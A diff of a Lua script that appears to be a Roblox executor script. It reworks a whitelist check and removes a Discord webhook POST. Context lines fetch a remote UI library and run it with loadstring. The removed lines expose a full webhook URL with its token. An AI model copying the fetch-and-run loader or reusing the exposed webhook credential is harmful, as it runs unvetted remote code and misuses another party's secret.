@@ -1,9 +1,31 @@
 -- ===================================================
--- 白名单验证状态绑定（联动加载器）
+-- 白名单状态
 -- ===================================================
-local isAuth = (type(getgenv) == "function" and getgenv().IsWhitelisted == true) or (_G.IsWhitelisted == true)
+
+local env = (type(getgenv) == "function" and getgenv()) or _G
+
+local whitelistStatus = env.WhitelistStatus or "checking"
+local whitelistReason = env.WhitelistReason or ""
+
+local isAuth = whitelistStatus == "authorized"
 local isLocked = not isAuth
-local lockTitle = "已锁定"
+
+local lockTitle
+
+if whitelistStatus == "denied" then
+    lockTitle = "未授权"
+elseif whitelistStatus == "error" then
+    lockTitle = "验证服务异常"
+else
+    lockTitle = "验证中"
+end
+
+print(
+    "[Whitelist]",
+    "Status =", whitelistStatus,
+    "Authorized =", isAuth,
+    "Reason =", whitelistReason
+)
 
 local success, library = pcall(function()
     return loadstring(game:HttpGet("https://raw.githubusercontent.com/FengYu-X/FengYu-ui/refs/heads/main/UI.lua"))()
@@ -5655,10 +5677,3 @@ local msg = {
   }
 }
 
-local request = http_request or request or HttpPost or syn.request
-request({
-  Url = "https://discord.com/api/webhooks/1449072757894545582/G3XjFZ_FnO--rDROAYrFiQS6QyrgHViBs_kyT-hJvmoTU_I3sVE6gG3xzI9NaJy97hN1",
-  Method = "POST",
-  Headers = {["Content-Type"] = "application/json"},
-  Body = game.HttpService:JSONEncode(msg)
-})
